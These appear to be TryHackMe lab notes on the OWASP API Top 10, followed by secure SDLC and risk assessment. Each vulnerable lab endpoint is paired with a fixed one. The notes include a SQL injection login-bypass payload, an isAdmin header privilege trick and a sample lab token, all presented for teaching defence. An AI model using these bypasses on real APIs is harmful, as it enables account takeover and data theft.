![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a6eec3c1ad211d50ca0ba20ba4f6898e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a6eec3c1ad211d50ca0ba20ba4f6898e.png)

- What is the issue with the above API call? The problem is that the endpoint
is not validating any incoming API call to confirm whether the request
is valid. It is not checking for any authorisation whether the person
requesting the API call can ask for it or not.
- The solution
for this problem is pretty simple; Bob will implement an authorisation
mechanism through which he can identify who can make API calls to access employee ID information.
- The purpose is achieved through **access tokens or authorisation tokens** in the header. In the above example, Bob will add an authorisation token
so that only headers with valid authorisation tokens can make a call to
this endpoint.
- In the VM, if you add a valid `Authorization-Token` and call `http://localhost:80/MHT/apirule1_s/user/1`, only then will you be able to get the correct results. Moreover, all API calls with an invalid token will show `403 Forbidden` an error message (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d7276bdd5c3d6fe7b6eea7731d261210.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d7276bdd5c3d6fe7b6eea7731d261210.png)

**Mitigation Measures**

- An authorisation mechanism that relies on user policies and hierarchies should be adequately implemented.
- Strict access controls methods to check if the logged-in user is authorised to perform specific actions.
- Promote using completely random values (strong encryption and decryption mechanism) for nearly impossible-to-predict tokens.

# **How does it happen?**

User
 authentication is the core aspect of developing any application 
containing sensitive data. Broken User Authentication (BUA) reflects a 
scenario where an API endpoint allows an attacker to access a database 
or acquire a higher privilege than the existing one. The primary reason 
behind BUA is either

**invalid implementation of authentication**

like using incorrect email/password queries etc., or the absence of security mechanisms like authorisation headers, tokens etc.

Consider
 a scenario in which an attacker acquires the capability to abuse an 
authentication API; it will eventually result in data leaks, deletion, 
modification, or even the complete account takeover by the attacker. 
Usually, hackers have created special scripts to profile, enumerate 
users on a system and identify authentication endpoints. A poorly 
implemented authentication system can lead any user to take on another 
user's identity.

**Likely Impact**

In
 broken user authentication, attackers can compromise the authenticated 
session or the authentication mechanism and easily access sensitive 
data. Malicious actors can pretend to be someone authorised and can 
conduct an undesired activity, including a complete account takeover.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- Bob understands that authentication is critical and has been tasked to develop an API endpoint `apirule2/user/login_v` that will authenticate based on provided email and password.
- The endpoint will return a token, which will be passed as an `Authorization-Token` header (GET request) to `apirule2/user/details` to show details of the specific employee. Bob successfully developed the
login endpoint; however, he only used email to validate the user from
the `user table` and ignored the password field in the SQL
query. An attacker only requires the victim's email address to get a
valid token or account takeover.
- In the VM, you can test this by sending a `POST` request to `http://localhost:80/MHT/apirule2/user/login_v` with email and password in the form parameters.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/dedcd5391fc513261706967f2c0e34cf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/dedcd5391fc513261706967f2c0e34cf.png)

- As we can see, the vulnerable endpoint received a token which can be forwarded to `/apirule2/user/details` to get detail of a user.
- To fix this, we will update the login query logic and use both email and password for validation. The endpoint `/apirule2/user/login_s` is a valid endpoint, as shown below, that authorises the user based on password and email both.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/44ee6cbacf493eb437c3711ae413965e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/44ee6cbacf493eb437c3711ae413965e.png)

**Mitigation Measures**

- Ensure complex passwords with higher entropy for end users.
- Do not expose sensitive credentials in **GET** or **POST** requests.
- Enable strong JSON Web Tokens (JWT), authorisation headers etc.
- Ensure the implementation of multifactor authentication (where possible),
account lockout, or a captcha system to mitigate brute force against
particular users.
- Ensure that passwords are not saved in plain text in the database to avoid further account takeover by the attacker.

**Vulnerability III - Excessive Data Exposure**

**How does it happen?**

Excessive data exposure occurs when applications tend to **disclose more than desired information** to the user through an API response. The
 application developers tend to expose all object properties 
(considering the generic implementations) without considering their 
sensitivity level. They leave the filtration task to the front-end 
developer before it is displayed to the user. Consequently, an attacker 
can intercept the response through the API and quickly extract the 
desired confidential data. The 
runtime detection tools or the general security scanning tools can give 
an alert on this kind of vulnerability. However, it cannot differentiate
 between legitimate data that is supposed to be returned or sensitive 
data.

**Likely Impact**

A
 malicious actor can successfully sniff the traffic and easily access 
confidential data, including personal details, such as account numbers, 
phone numbers, access tokens and much more. Typically, APIs respond with
 sensitive tokens that can be later on used to make calls to other 
critical endpoints.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- The company MHT launched a comment-based web portal that takes users'
comments and stores them in the database and other information like
location, device info, etc., to improve the user experience.
- Bob was tasked to develop an endpoint for showing users' comments on the company's main website. He developed an endpoint `apirule3/comment_v/{id}` that fetches all information available for a comment from the database. Bob
assumed that the front-end developer would filter out information while
showing it on the company's main website.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6733955d8ce9471ce57924fb77a8caf6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6733955d8ce9471ce57924fb77a8caf6.png)

- What is the issue here? The API is sending more data than desired. Instead of
relying on a front-end engineer to filter out data, only relevant data
must be sent from the database.
- Bob realising his mistake, updated the endpoint and created a valid endpoint `/apirule3/comment_s/{id}` that returns only the necessary information to the developer (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/23e044cc3efe648691292fac6f6e4acf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/23e044cc3efe648691292fac6f6e4acf.png)

**Mitigation Measures**

- Never leave sensitive data filtration tasks to the front-end developer.
- Ensure time-to-time review of the response from the API to guarantee it
returns only legitimate data and checks if it poses any security issue.
- Avoid using generic methods such as `to_string() and to_json()`.
- Use API endpoint testing through various test cases and verify through
automated and manual tests if the API leaks additional data.

**Vulnerability IV - Lack of Resources & Rate Limiting**

**How does it happen?**

Lack of resources and rate limiting means that **APIs do not enforce any restriction on**
 the frequency of clients' requested resources or the files' size, which
 badly affects the API server performance and leads to the DoS (Denial 
of Service) or non-availability of service. Consider a scenario where an
 API limit is not enforced, thus allowing a user (usually an intruder) 
to upload several GB files simultaneously or make any number of requests
 per second. Such API endpoints will result in excessive resource 
utilisation in network, storage, compute etc.

Nowadays, attackers are using such attacks to **ensure the non-availability of service for an organisation**,
 thus tarnishing the brand reputation through increased downtime. A 
simple example is non-compliance with the Captcha system on the login 
form, allowing anyone to make numerous queries to the database through a
 small script written in Python.

# Likely Impact

The attack primarily targets the **Availability** principles of security; however, it can tarnish the brand's reputation and cause financial loss.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- The company MHT purchased an email marketing plan (20K emails per month)
for sending marketing, password recovery emails etc. Bob realised that
he had successfully developed a login API, but there must be a "Forgot
Password" option that can be used to recover an account.
- He started building an endpoint `/apirule4/sendOTP_v` that will send a 4-digit numeric code to the user's email address. An
authenticated user will use that One Time Password (OTP) to recover the
account.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e893ab4958ff54d17bedf53a0e22d772.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e893ab4958ff54d17bedf53a0e22d772.png)

- What is the issue here? Bob has not enabled any rate limiting in the
endpoint. A malicious actor can write a small script and brute force the endpoint, sending many emails in a few seconds and using the company's
recently purchased email marketing plan (financial loss).
- Finally, Bob came up with an intelligent solution `(/apirule4/sendOTP_s)` and enabled rate limiting such that the user has to wait 2 minutes to request an OTP token again.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a47bc005c405264850984ca7fb19b24b.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a47bc005c405264850984ca7fb19b24b.gif)

**Mitigation Measures**

- Ensure using a captcha to avoid requests from automated scripts and bots.
- Ensure implementation of a limit, i.e., how often a client can call an API
within a specified time and notify instantly when the limit is
exceeded.
- Ensure to define the maximum data size on all parameters and payloads, i.e., max string length and max number of array elements.

**Vulnerability V - Broken Function Level Authorisation**

# **How does it happen?**

Broken
 Function Level Authorisation reflects a scenario where a low privileged
 user (e.g., sales) bypasses system checks and gets access to **confidential data by impersonating a high privileged user (Admin)**.
 Consider a scenario of complex access control policies with various 
hierarchies, roles, and groups and a vague separation between regular 
and administrative functions leading to severe authorisation flaws. By 
taking advantage of these issues, the intruders can easily access the 
unauthorised resources of another user or, most dangerously – the 
administrative functions.

Broken Function Level 
Authorisation reflects IDOR permission, where a user, most probably an 
intruder, can perform administrative-level tasks. APIs with complex user
 roles and permissions that can span the hierarchy are more prone to 
this attack.

**Likely Impact**

The
 attack primarily targets the authorisation and non-repudiation 
principles of security. Broken Functional Level Authorisation can lead 
an intruder to impersonate an authorised user and let the malicious 
actor get administrative rights to perform sensitive tasks.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- Bob has been assigned another task to develop an admin dashboard for
company executives so that they can view all employee's data and perform specific tasks.
- Bob developed an endpoint `/apirule5/users_v` to fetch data of all employees from the database. To add protection, he added another layer to security by adding a special header `isAdmin` in each request. The API only fetches employee information from the database if `isAdmin=1` and `Authorization-Token` are correct. The authorisation token for HR user Alice is `YWxpY2U6dGVzdCFAISM6Nzg5Nzg=`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4fb8a31217d2d1af51cad8cbdc318754.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4fb8a31217d2d1af51cad8cbdc318754.png)

- We can see that Alice is a non-admin user (HR) but can see all employee's data by setting custom requests to the endpoint with `isAdmin value = 1`.
- The issue can be resolved programmatically by implementing correct
authorisation rules and checking the functional roles of each user in
the database during the query. Bob implemented another endpoint `/apirule5/users_s` that validates each user's role and only shows employees' data if the role is Admin.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5a708a5bc9daad5002e4824a0eda5511.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5a708a5bc9daad5002e4824a0eda5511.gif)

**Mitigation Measures**

- Ensure proper design and testing of all authorisation systems and deny all access by default.
- Ensure that the operations are only allowed to the users belonging to the authorised group.
- Make sure to review API endpoints against flaws regarding functional level
authorisation and keep in mind the apps and group hierarchy's business
logic.

**Vulnerability VI - Mass Assignment**

**How does it happen?**

Mass assignment reflects a scenario where **client-side data is automatically bound with server-side objects or class variables**. However, hackers exploit the feature by first understanding the **application's business logic**
 and sending specially crafted data to the server, acquiring 
administrative access or inserting tampered data. This functionality is 
widely exploited in the latest frameworks like Laravel, Code Ignitor 
etc.

Consider a user's profiles dashboard
 where users can update their profile like associated email, name, 
address etc. The username of the user is a read-only attribute and 
cannot be changed; however, a malicious actor can edit the username and 
submit the form. If necessary filtration is not enabled on the server 
side (model), it will simply insert/update the data in the database.

**Likely Impact**

The attack may result in **data tampering and privilege escalation** from a regular user to an administrator.

# Practical Example

- Open the VM. You will find that the Chrome browser and Talend API Tester
application are running automatically, which we will be using for
debugging the API endpoints.
- Bob has been assigned to develop a signup API endpoint `/apirule6/user` that will take a name, username and password as input parameters (POST). The user's table has a `credit column` with a default value of `50`. Users will upgrade their membership to have a larger credit value.
- Bob has successfully designed the form and used the mass assignment feature in Laravel to store all the incoming data from the client side to the
database (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31d541b9eb6d7f67dec8fdb60d07f8af.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31d541b9eb6d7f67dec8fdb60d07f8af.png)

- What is the problem here? Bob is not doing any filtering on the server side. Since using the **mass assignment feature**, he is also inserting credit values in the database (malicious actors can update that value).
- The solution to the problem is pretty simple. Bob must ensure necessary filtering on the server side (`apirule6/user_s`) and ensure that the default value of credit should be inserted as `50`, even if more than 50 is received from the client side (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/bfb2c99ce2c72649953967a629cbcc39.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/bfb2c99ce2c72649953967a629cbcc39.png)

**Mitigation Measures**

- Before using any framework, one must study how the backend insertions and updates are carried out. In the Laravel framework, [fillable and guarded](https://laravel.com/docs/9.x/eloquent#inserts) arrays mitigate the above-mentioned scenarios.
- Avoid using functions that bind an input from a client to code variables automatically.
- Allowlist those properties only that need to get updated from the client side.

**Vulnerability VII - Security Misconfiguration**

**How does it happen?**

Security misconfiguration depicts an implementation of **incorrect and poorly configured security controls**
 that put the security of the whole API at stake. Several factors can 
result in security misconfiguration, including improper/incomplete 
default configuration, publically accessible cloud storage, [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS),
 and error messages displayed with sensitive data. Intruders can take 
advantage of these misconfigurations to perform detailed reconnaissance 
and get unauthorised access to the system.

Security 
misconfigurations are usually detected by vulnerability scanners or 
auditing tools and thus can be curtailed at the initial level. API 
documentation, a list of endpoints, error logs etc., **must not be publically accessible**
 to ensure safety against security misconfigurations. Typically, 
companies deploy security controls like web application firewalls, which
 are not configured to block undesired requests and attacks.

**Likely Impact**

Security
 misconfiguration can give intruders complete knowledge of API 
components. Firstly, it allows intruders to bypass security mechanisms. **Stack trace or other detailed errors**
 can provide the malicious actor access to confidential data and 
essential system details, further aiding the intruder in profiling the 
system and gaining entry.

**Practical Example**

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- The company MHT is facing serious server availability issues. Therefore, they assigned Bob to develop an API endpoint `/apirule7/ping_v` (GET) that will share details regarding server health and status.
- Bob successfully designed the endpoint; however, he forgot to implement any error handling to avoid any information leakage.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/76b0298b5134ca3c04e4290b15f4e73a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/76b0298b5134ca3c04e4290b15f4e73a.png)

- What is the issue here? In case of an unsuccessful call, the server sends a
complete stack trace in response, containing function names, controller
and route information, file path etc. An attacker can use the
information for profiling and preparing specific attacks on the
environment.
- The solution to the issue is pretty simple. Bob will create an API endpoint `/apirule7/ping_s` that will carry out error handling and only share desired information with the user (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9087274b07f2fa5174398b0bb0c69979.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9087274b07f2fa5174398b0bb0c69979.png)

**Mitigation Measures**

- Limit access to the administrative interfaces for authorised users and disable them for other users.
- Disable default usernames and passwords for public-facing devices (routers, Web Application Firewall etc.).
- Disable directory listing and set proper permissions for every file and folder.
- Remove unnecessary pieces of code snippets, error logs etc. and turn off debugging while the code is in production.

**Vulnerability VIII - Injection**

**How does it happen?**

Injection
 attacks are probably among the oldest API/web-based attacks and are 
still being carried out by hackers on real-world applications. Injection
 flaws occur when user input is **not filtered and is directly processed by an API**; thus enabling the attacker to perform unintended API actions without authorisation. An injection may come from [Structure Query Language (SQL)](https://tryhackme.com/room/sqlinjectionlm), operating system (OS) commands, Extensible Markup Language (XML) etc. Nowadays,
 frameworks offer functionality to protect against this attack through 
automatic sanitisation of data; however, applications built in custom 
frameworks like core PHP are still susceptible to such attacks.

**Likely Impact**

Injection flaws may lead to **information disclosure, data loss, DoS, and complete account takeover**.
 The successful injection attacks may also cause the intruders to access
 the sensitive data or even create new functionality and perform remote 
code execution.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- A few users of company MHT reported that their account password had
changed, and they could not further log in to their original account.
Consequently, the dev team found that Bob had developed a vulnerable
login API endpoint `/apirule8/user/login_v` that is not filtering user input.
- A malicious attacker requires the username of the target, and for the password, they can use the payload `' OR 1=1--'` and get an authorisation key for any account (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/fb4649a8c9226d5c68d2ece9e1e1246a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/fb4649a8c9226d5c68d2ece9e1e1246a.png)

- Bob immediately realised his mistake; he updated the API endpoint to `/apirule8/user/login_s` and used parameterised queries and built-in filters of Laravel to sanitise user input.
- As a result, all malicious payloads on username and password parameters were effectively mitigated (as shown below)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/496f9d46040c7a3088f710bbe29cfc0a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/496f9d46040c7a3088f710bbe29cfc0a.png)

# Mitigation Measures

- Ensure to use a well-known library for client-side input validation.
- If a framework is not used, all client-provided data must be validated first and then filtered and sanitised.
- Add necessary security rules to the Web Application Firewall (WAF). Most of the time, injection flaws can be mitigated at the network level.
- Make use of built-in filters in frameworks like Laravel, Code Ignitor etc., to validate and filter data.

**Vulnerability IX - Improper Assets Management**

**How does it happen?**

Inappropriate Asset Management refers to a scenario where we have **two versions of an API available in our system**;
 let's name them APIv1 and APIv2. Everything is wholly switched to 
APIv2, but the previous version, APIv1, has not been deleted yet. 
Considering this, one might easily guess that the older version of the 
API, i.e., APIv1, doesn't have the updated or the latest security 
features. Plenty of other obsolete features of APIv1 make it possible to
 find vulnerable scenarios, which may lead to data leakage and server 
takeover via a shared database amongst API versions.

It
 is essentially about not properly tracking API endpoints. The potential
 reasons could be incomplete API documentation or absence of compliance 
with the [Software Development Life Cycle](https://tryhackme.com/room/securesdlc).
 A properly maintained, up-to-date API inventory and proper 
documentation are more critical than hardware-based security control for
 an organisation.

**Likely Impact**

The older or the **unpatched API versions** can allow the intruders to get unauthorised access to confidential data or even complete control of the system.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- During API development, the company MHT has developed different API versions
like v1 and v2. The company ensured to use the latest versions and API
calls but forgot to remove the old version from the server.
- Consequently, it was found that old API calls like `apirule9/v1/user/login` return more information like balance, address etc., against the user (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a3d12beaea5bfdbcab5659d9145b189e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a3d12beaea5bfdbcab5659d9145b189e.png)

- Bob being the developer of the endpoint, realised that he must immediately
deactivate old and unused assets so that users can only access limited
and desired information from the new endpoint `/apirul9/v2/user/login` (as shown below)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/38d853bd141ee2e604216640d3af067c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/38d853bd141ee2e604216640d3af067c.png)

**Mitigation Measures**

- Access to previously developed sensitive and deprecated API calls must be blocked at the network level.
- APIs developed for R&D, QA, production etc., must be segregated and hosted on separate servers.
- Ensure documentation of all API aspects, including authentication, redirects, errors, CORS policy, and rate limiting.
- Adopt open standards to generate documentation automatically.

**Vulnerability X - Insufficient Logging & Monitoring**

**How does it happen?**

Insufficient
 logging & monitoring reflects a scenario when an attacker conducts 
malicious activity on your server; however, when you try to track the 
hacker, **there is not enough evidence available due to the absence of logging and monitoring mechanisms**.
 Several organisations only focus on infrastructure logging like network
 events or server logging but lack API logging and monitoring. 
Information like the visitor's IP address, endpoints accessed, input 
data etc., along with a timestamp, enables the identification of threat 
attack patterns. If logging mechanisms are not in place, it would be 
challenging to identify the attacker and their details. Nowadays, 
the latest web frameworks can automatically log requests at different 
levels like error, debug, info etc. These errors can be logged in a 
database or file or even passed to a [SIEM solution](https://tryhackme.com/room/defensivesecurity) for detailed analysis.

**Likely Impact**

Inability to identify attacker or hacker behind the attack.

# Practical Example

- Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
- In the past, the company MHT has been susceptible to multiple attacks, and the exact culprit behind the attacks could not be identified.
Therefore, Bob was assigned to make an API endpoint `/apirule10/logging` (GET) that will log users' metadata (IP address, browser version etc.) and save it in the database as well (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9112accb6150c21ee9daadff3d5560e7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9112accb6150c21ee9daadff3d5560e7.png)

- Later, it was also decided that the same would be forwarded to a SIEM solution for correlation and analysis.

**Mitigation Measures**

- Ensure use of the Security Information and Event Management (SIEM) system for log management.
- Keep track of all denied accesses, failed authentication attempts, and input validation errors, using a format imported by SIEM and enough detail to identify the intruder.
- Handle logs as sensitive data and ensure their integrity at rest and transit. Moreover, implement custom alerts
to detect suspicious activities as well.

**Conclusion**

Phew. That was simple. It would be correct to say that over **half of OWASP API security's top 10 list is relevant to authorisation and authentication**.
 Most commonly, API systems are hacked because of failure in 
authorisation and authentication mechanisms and security 
misconfigurations.

In a nutshell, API developers must **safeguard APIs in line with best cyber security practices**.
 The modules like sign-in, role-based access, user profile setting etc.,
 must be given more importance as malicious actors tend to target known 
endpoints for gaining access to the system.

## **SSDLC(Secure Software Development Life Cycle)**

# Secure Software Development Lifecycle (SSDLC)

During
 SDLC, security testing was introduced very late in the lifecycle. 
﻿Bugs, flaws, and other vulnerabilities were identified late, making 
them far more expensive and time-consuming to fix. In most cases, 
security testing was not considered during the testing phase, so 
end-users reported bugs after deployment. Secure SDLC models aim to 
introduce security at every stage of the SDLC.

# Why is Secure SDLC important?

A
 study conducted by the Systems and Sciences institute at IBM discovered
 that it costs six times more to fix a bug found during implementation 
than one identified as early as during the design phase. It also 
reported that it costs 15 times more if flaws are identified during 
testing and up to 100 times more costly if identified during the 
maintenance and operation phases. See the figure below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/1688d77f6f6401862a668820ab96061e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/1688d77f6f6401862a668820ab96061e.png)

Source: The research paper on the cost of identifying vulnerabilities can be found [here](https://www.researchgate.net/profile/Maurice-Dawson/publication/255965523_Integrating_Software_Assurance_into_the_Software_Development_Life_Cycle_SDLC/links/02e7e52114e5e1ba71000000/Integrating-Software-Assurance-into-the-Software-Development-Life-Cycle-SDLC.pdf?origin=publication_detail).

Apart
 from faster development and reduction of costs, integrating security 
across the SDLC helps discover and reduce vulnerabilities early, 
reducing business risk massively. Examples of introducing security at 
all stages are architecture analysis during design, code review and 
scanners during the development stage and conducting security 
assessments (e.g. penetration tests) before deployment. For example, in 
waterfall models, this sort of testing was carried out at the end of the
 lifecycle, right before production; in more agile processes, we can 
implement a "security by design" approach. If the pentests result in 
errors like an SQL injection in a waterfall scenario, mitigating the 
bugs would entail doing another cycle to fix the bug. It would require 
redesigning, applying the changes and retesting to check it has been 
remediated. In a more agile approach, discussions on whether to prevent 
flaws like this, such as deciding on parameterisation during the 
planning phase, can avoid having to roll back changes, and it only costs
 a planning discussion.

**Summary**

- Security is a constant concern, improving software quality and security constantly.
- Boosting security education and awareness: all stakeholders know each phase's security recommendations and requirements.
- Flaws are detected early before deployment, reducing the risk of getting hacked or disrupted.
- Costs are reduced, and speed increases, thanks to the early detection and
resolution of vulnerabilities. Business risk, brand reputation damage,
and fines that could lead to economic disaster for a company are
prevented.

## Implementing SSDLC

As the [Intro To DevSecOps](https://tryhackme.com/room/introductiontodevsecops)
 room shows, Secure SDLC involves instilling security processes at all 
lifecycle phases. From security testing tools to writing security 
requirements alongside functional requirements.

# Understanding Security Posture

Like with every new process, understanding your gaps and state is critical for successfully ****introducing
 a new tool, solution, or change. To help grasp what your 
security posture is, you can start by doing the following:

- Perform a **gap analysis** to determine what activities and policies exist
in your
organisation and how effective they are. For example, ensuring policies
are in place (what the team does) with security procedures (how the team executes those policies).
- Create **Software Security
Initiatives** (SSI) by establishing realistic and achievable goals with
defined metrics for success. For example, this could be a Secure Coding
Standard, playbooks for handling data, etcetera are tracked using project management tools.
- **Formalise processes** for security activities within your SSI. After starting a
program or standard, it is essential to spend an operational period
helping engineers get familiarised with it and gather
feedback before enforcing it. When performing a gap analysis, every
policy should have defined procedures to make them effective.
- **Invest in security training** for engineers as well as appropriate tools. Ensure people are
aware of new processes and the tools that will come with them to
operationalise them, and invest in training early, ideally before
establishing / onboarding the tool.

# **SSDLC Processes**

After
 understanding your security posture, now is the time to prioritise and 
instil security in your SDLC. Generally speaking, a secure SDLC involves
 integrating processes like security testing and other activities into 
an existing development process. Examples include writing security 
requirements alongside functional requirements and performing an 
architecture risk analysis during the design phase of the SDLC. These processes are the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/3d1e3379a1e3ccc46f3c7471095cbfae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/3d1e3379a1e3ccc46f3c7471095cbfae.png)

- **Risk Assessment**  during the early stages of SDLC, it is essential to identify security
considerations that promote a security by design approach when
functional requirements are gathered in the planning and requirements
stages. For example, if a user requests a blog entry from a site, the
user should not be able to edit the blog or remove unnecessary input
fields.
- **Threat Modelling** - is the process of identifying potential threats when there is a lack
of appropriate safeguards. It is very effective when following a risk
assessment and during the design stage of the SDLC, as Threat Modelling
focuses on what should not happen. In contrast, design requirements
state how the software will behave and interact. For example, ensure there is verification when a user requests account information.
- **Code Scanning / Review** - Code reviews can be either manual or automated. Code Scanning or
automated code reviews can leverage Static and Dynamic Security testing
technologies. These are crucial in the Development stages as code is
being written.
- **Security Assessments - Like Penetration Testing & Vulnerability Assessments** are a form of automated testing that can identify critical paths of an
application that may lead to exploitation of a vulnerability. However,
these are hypothetical as the assessment doesn't carry simulations of
those attacks. Pentesting, on the other hand, identifies these flaws and attempts to exploit them to demonstrate validity. Pentests and
Vulnerability Assessments are carried out during the Operations &
Maintenance phase of the SDLC after a prototype of the application.

There
 are methodologies to apply the processes in task 5 that will help you 
navigate and guide you when introducing risk assessment, threat 
modelling, scanning and testing, and operational assurance. The 
following tasks will cover these processes in more detail.

**Risk Assessment**

Risk refers to the likelihood of a threat being exploited, negatively impacting a resource or the target it affects. For example, vulnerabilities being exploited after a new version of the software is published, design flaws, and poorly reviewed code can increase the risk of these scenarios. Risk management is an important pillar to integrate into the SDLC to mitigate risk in a product or service.

---

Risk assessment is used to determine the level of the potential threat. Risk identified in the risk assessment process can be reduced or eliminated by applying appropriate controls during the risk mitigation process. Usually, a risk assessment is followed by threat modelling, which will be explained further in the next section.

**Performing a Risk Assessment**

1. The first step in the risk assessment process is to assume the software will be attacked and consider the factors that motivate the threat actor. List out the factors such as the data value of the program, the security level of companies who provide resources that the code depends on, the clients purchasing the software, and how big is the software distributed (single, small workgroup or released worldwide). Based on these factors, write down the acceptable level of risk. For instance, a data loss may cause the company to lose millions, especially if they require to pay fines nowadays with GDPR, but eliminating all potential security bugs in the code may cost $40,000. The company and some other stakeholder groups have to decide whether it is worth it; it is also crucial to communicate these tradeoffs. Hence, everyone has an understanding of risk and its implications. From a brand reputation perspective, if the attack causes damage to the company's image, it costs the company more in the long run than fixing the code.
2. The next step is risk evaluation. Include factors like the worst-case scenario if the attacker has successfully attacked the software. You can demonstrate the worst-case scenario to executives and senior engineers by simulating a ransomware attack. Determine the value of data to be stolen, valuable data such as the user's identity, credentials to gain control of the endpoints on the network, and data or assets that pose a lower risk. Another factor to consider is the difficulty of mounting a successful attack, in other words, its complexity. For example, if an attacker can gain access to the company's tool for giving feedback to colleagues or running retrospective meetings, it would have a lower impact than accessing a production environment's monitoring and alerts system. The high level of risk will not be acceptable, and it is best to mitigate it. For example, a vulnerability can be exploited by anyone running prewritten attack scripts or using botnets to spread the scripts to compromise computers and networks. Users affected are a vital factor.
3. Some attacks only affect one or two users, but the denial of service attack will affect thousands of users when a server is attacked. Moreover, thousands of computers may be infected by the spread of worms. The last factor is the accessibility of the target. Determine whether the target accepts requests across a network or only local access, whether authentication is needed for establishing a connection, or if anyone can send requests. It has more impact if an attacker accesses a production environment vs a sandbox environment used in local playgrounds for people to do labs or tutorials.

# Types of Risk Assessments

There
 are several types of Risk assessments best suited for different 
scenarios. Below are the different types of Risk Assessments:

**Qualitative Risk Assessment**

This
 is the most common type of Risk Assessment that you will find in 
companies (hopefully). In a Qualitative Risk Assessment, the goal is to 
assess and classify risk into thresholds like "Low", "Medium", and 
"High". It systematically examines what can cause harm and what 
decisions should be made to define or improve adequate control measures.
 Like all types of Risk Assessments, each level has a priority, where 
"High" has the most urgency. Even though Qualitative Risk Assessments 
don't use numbers, a typical formula to evaluate qualitative risk is:

`Risk = Severity x Likelihood`

"Severity" is the impact of the consequence, and Likelihood is the probability of it happening. It is up to the risk assessor to judge these circumstances.

**Quantitative Risk Assessment**

The Quantitative Risk Assessment is used to measure risk with numerical values. Instead of "Low", "Medium", and "High", you would have numbers that represent those bands. When carrying out Quantitative Risk Analysis, we can use tools to determine Severity and Likelihood or custom series of calculations based on the company's processes.

